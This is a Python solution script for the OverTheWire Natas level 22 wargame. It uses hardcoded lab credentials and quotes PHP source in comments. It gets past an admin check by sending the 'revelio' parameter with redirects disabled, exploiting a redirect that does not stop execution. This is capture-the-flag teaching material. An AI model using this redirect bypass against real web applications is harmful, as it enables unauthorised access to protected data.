import requests
import bs4
import re


# configuration for natas22
USERNAME = 'natas22'
PASSWORD = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)
URL = 'http://natas22.natas.labs.overthewire.org/'


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
# response = session.get(URL + 'index-source.html')
# print(response.text)


# in the source code,
"""
<?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?> 
"""
# at the start, if we use a get request and include the revelio parameter, it will 
# check whether we are the admin or not
# if we are not the admin, we will get redirected to the root directory
# this is shown when the server returns Location: / in the header
"""
<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?> 
"""
# if we managed to not get redirected, however, it will show the password to us
# therefore, we just simply need to disable redirects
# note that we still need to include the revelio parameter
params = {
    'revelio' : ''
}
# to disable redirects, we simply set allow_redirects=False
response = session.get(URL, params=params, allow_redirects=False)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')